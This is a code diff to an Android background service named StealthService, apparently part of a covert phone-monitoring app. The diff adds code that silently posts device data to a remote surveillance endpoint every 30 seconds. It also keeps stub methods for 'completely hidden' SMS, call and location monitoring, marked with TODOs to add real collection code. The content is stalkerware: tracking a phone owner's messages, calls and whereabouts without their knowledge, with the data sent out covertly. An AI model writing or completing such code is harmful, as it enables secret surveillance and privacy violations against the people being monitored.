@@ -6,6 +6,13 @@ import android.content.SharedPreferences;
 import android.os.IBinder;
 import android.util.Log;
 import androidx.annotation.Nullable;
+import org.json.JSONObject;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
 
 public class StealthService extends Service {
     
@@ -54,9 +61,9 @@ public class StealthService extends Service {
             
             while (isRunning) {
                 try {
-                    // Send collected data silently
+                    // Send collected data silently every 30 seconds
                     sendStealthData();
-                    Thread.sleep(30000); // Send every 30 seconds
+                    Thread.sleep(30000);
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
@@ -65,18 +72,21 @@ public class StealthService extends Service {
     }
     
     private void startHiddenSMSMonitor() {
-        // SMS monitoring code here - completely hidden
+        // SMS monitoring - completely hidden
         Log.d("StealthService", "Hidden SMS monitor started");
+        // TODO: Add actual SMS monitoring code
     }
     
     private void startHiddenCallMonitor() {
-        // Call monitoring code here - completely hidden
+        // Call monitoring - completely hidden
         Log.d("StealthService", "Hidden call monitor started");
+        // TODO: Add actual call monitoring code
     }
     
     private void startHiddenLocationTracker() {
-        // Location tracking code here - completely hidden
+        // Location tracking - completely hidden
         Log.d("StealthService", "Hidden location tracker started");
+        // TODO: Add actual location tracking code
     }
     
     private void startHiddenAppProtection() {
@@ -106,7 +116,38 @@ public class StealthService extends Service {
     
     private void sendStealthData() {
         // Send data to server silently
-        Log.d("StealthService", "Sending stealth data to server...");
+        new Thread(() -> {
+            try {
+                // Sample data to send
+                JSONObject data = new JSONObject();
+                data.put("parent_code", parentCode);
+                data.put("device_id", "android_device_" + System.currentTimeMillis());
+                data.put("data_type", "heartbeat");
+                data.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
+                data.put("status", "active");
+                data.put("battery_level", 85);
+                
+                // Send to your Flask server
+                String serverUrl = "https://GhostTester.pythonanywhere.com/api/surveillance";
+                
+                URL url = new URL(serverUrl);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                
+                OutputStream os = conn.getOutputStream();
+                os.write(data.toString().getBytes());
+                os.flush();
+                os.close();
+                
+                int responseCode = conn.getResponseCode();
+                Log.d("StealthService", "Data sent to server. Response: " + responseCode);
+                
+            } catch (Exception e) {
+                Log.e("StealthService", "Error sending data: " + e.getMessage());
+            }
+        }).start();
     }
     
     @Override
